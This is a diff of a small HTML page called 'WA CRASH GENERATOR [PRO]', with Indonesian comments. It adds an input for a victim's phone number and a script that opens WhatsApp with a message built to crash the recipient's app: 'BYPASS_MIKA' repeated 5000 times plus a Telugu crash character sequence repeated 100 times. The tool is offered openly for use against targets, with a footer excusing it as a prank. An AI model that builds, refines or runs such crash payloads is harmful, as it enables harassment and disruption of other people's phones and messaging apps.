@@ -1,24 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Mika Project - Bug WA</title>
+    <title>Mika Project - Bug WA Pro</title>
     <style>
-        body { background: #000; color: #0f0; text-align: center; font-family: monospace; padding-top: 50px; }
-        button { padding: 20px; background: #0f0; border: none; font-weight: bold; cursor: pointer; }
+        body { background: #000; color: #0f0; text-align: center; font-family: monospace; padding-top: 30px; }
+        input { padding: 15px; width: 80%; background: #111; border: 1px solid #0f0; color: #0f0; font-size: 1.2em; margin-bottom: 20px; text-align: center; }
+        button { padding: 20px; width: 85%; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; font-size: 1.3em; border-radius: 5px; }
+        button:active { background: #0a0; }
+        .danger { color: #f00; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>WA CRASH GENERATOR</h1>
-    <p>Klik tombol di bawah buat kirim "paket" ke WA:</p>
+    <h1>WA CRASH GENERATOR <span class="danger">[PRO]</span></h1>
+    <p>Masukkan Nomor Target (Pakai format 62, contoh: 628123xxx):</p>
     
-    <button onclick="kirimBug()">KIRIM BUG SEKARANG</button>
+    <input type="number" id="nomorTarget" placeholder="Contoh: 628123456789" value="628">
+    <br>
+    <button onclick="kirimBug()">KIRIM BUG KE NOMOR INI!</button>
+
+    <p style="margin-top:40px; color:#555;">Dibuat oleh: Almika Project<br>⚠️ Guna untuk jahil, bukan ngerusak!</p>
 
     <script>
         function kirimBug() {
-            // Karakter "berat" yang bikin WA pusing baca kodenya
-            let bugText = "BYPASS_MIKA".repeat(5000); 
-            let target = "6281234567890"; // GANTI NOMOR TARGET DI SINI
+            // Ambil nomor dari kotak input
+            let target = document.getElementById("nomorTarget").value;
             
+            // Cek validasi simpel (minimal harus 628)
+            if (target.length < 5 || !target.startsWith("628")) {
+                alert("Nomor salah Mik! Harus pakai format 628xxxxxxxx.");
+                return;
+            }
+
+            // Karakter "berat" yang bikin WA pusing (pakai simbol unik)
+            // Teks BYPASS_MIKA diulang 5000x + Simbol Crash (జ్ఞా)
+            let bugText = "BYPASS_MIKA".repeat(5000) + "జ్ఞా".repeat(100); 
+            
+            // Jalankan perintah buka WA
             window.location.href = "whatsapp://send?phone=" + target + "&text=" + encodeURIComponent(bugText);
         }
     </script>
